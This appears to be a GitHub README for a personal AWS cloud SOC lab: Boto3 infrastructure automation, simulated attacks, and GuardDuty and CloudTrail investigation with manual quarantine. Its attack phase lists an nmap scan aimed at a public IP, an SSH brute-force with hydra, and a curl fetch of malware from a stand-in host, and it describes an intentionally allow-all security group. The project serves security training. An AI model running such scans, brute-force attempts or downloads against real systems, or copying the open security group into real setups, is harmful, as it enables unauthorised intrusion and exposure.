AWS Cloud SOC Simulation: Detection, Attack Emulation & Incident Response

## 📌 Overview
This project simulates a real-world cloud security incident using AWS. It covers everything from infrastructure automation to attack simulation and incident response. I used Python and Boto3 to automate VPC and EC2 deployment, launched attack simulations from a Kali machine, and investigated alerts with GuardDuty and CloudTrail like a real SOC analyst.

🔗 Full documentation with screenshots and commands:  
👉 [documenting.md](https://github.com/jmcoded0/AWS-Cloud-SOC-Simulation-Detection-Attack-Emulation-Incident-Response/blob/main/documenting.md)

## 🧰 Tools & Skills Used
- **Cloud:** AWS (EC2, VPC, GuardDuty, CloudTrail, CloudWatch, IAM, SSM)
- **Automation:** Python, Boto3
- **Security:** SOC workflows, threat detection, IOCs, incident response
- **Attack Simulation:** Nmap, Hydra, curl
- **Monitoring & Logging:** CloudWatch Agent, SSM Parameter Store

## 🎯 Project Goals
- Automate AWS infrastructure (VPC, EC2, security groups) using Python and Boto3.
- Simulate real-world attacks (port scans, SSH brute-force, fake malware downloads).
- Analyze GuardDuty findings and CloudTrail logs to extract IOCs.
- Practice SOC analyst tasks like quarantining compromised resources.

## ⚙️ Phases

### ✅ Phase 1: VPC Automation
- Created a custom VPC (`10.0.0.0/16`), subnets, Internet Gateway, and Route Table using Boto3.
- Used `config.py` for reusable variables.
- **Lesson:** Break scripts into steps and print IDs for easier debugging.

### ✅ Phase 2: Security Group Setup
- Created `coded-sg-v2` security group allowing all traffic (lab-only, insecure).
- Verified default VPC ID using AWS CLI.
- **Lesson:** Intentionally insecure setups maximize detection visibility.

### ✅ Phase 3: EC2 Attacker Setup
- Launched an Ubuntu EC2 instance (`t2.micro`, AMI: `ami-04b70fa74e45c3917`).
- Configured CloudWatch Agent via SSM Parameter Store to monitor logs (`/var/log/syslog`, `/var/log/auth.log`) and metrics.
- Installed tools like `nmap` and `curl` for attack simulation.
- **Lesson:** SSM-managed configs are scalable for monitoring.

### ✅ Phase 4: Attack Simulation
- Simulated:
  - Port scans: `nmap -sS 1.1.1.1`
  - SSH brute-force: `hydra`
  - Fake malware downloads: `curl http://badhost.com/malware`
- Triggered GuardDuty malware detection events (`/aws/guardduty/malware-scan-events`).
- **Lesson:** Even failed commands can trigger behavioral detections.

### ✅ Phase 5: Forensics and IOC Extraction
- Analyzed GuardDuty findings:
  - `Recon:EC2/Portscan`
  - `Backdoor:EC2/DenialOfService.TorClient`
- Extracted IOCs such as:
  - IP: `1.1.1.1`
  - Port: `35`
  - Instance ID: `i-0bca611a4c23538c8`
- Encountered CloudTrail permission error (`cloudtrail:LookupEvents`).
- **Lesson:** IAM policies are critical gatekeepers.

### ✅ Phase 5.2: Manual Quarantine
- Tagged the compromised EC2 instance with `Quarantine=True`.
- Stopped the instance manually.
- **Lesson:** Manual containment builds real IR muscle memory.

### ✅ Phase 6: CloudTrail Analysis
- Correlated GuardDuty findings with CloudTrail logs.
- Investigated snapshot usage and event history.
- **Lesson:** Logs provide crucial context for incident reconstruction.

## 💡 Key Lessons
- Cloud security is tactical—it requires real, hands-on AWS practice.
- GuardDuty + CloudTrail offer deep visibility into threat activity.
- Manual response steps (like tagging or stopping instances) are valid IR actions.
- IAM permissions directly impact your ability to investigate.

## 🙋 Reflections
This project taught me how to think like a cloud security analyst—from building and misconfiguring infrastructure, to simulating real attacks, investigating alerts, and responding manually. It was a full, hands-on journey through AWS security tools like GuardDuty, CloudTrail, and IAM.
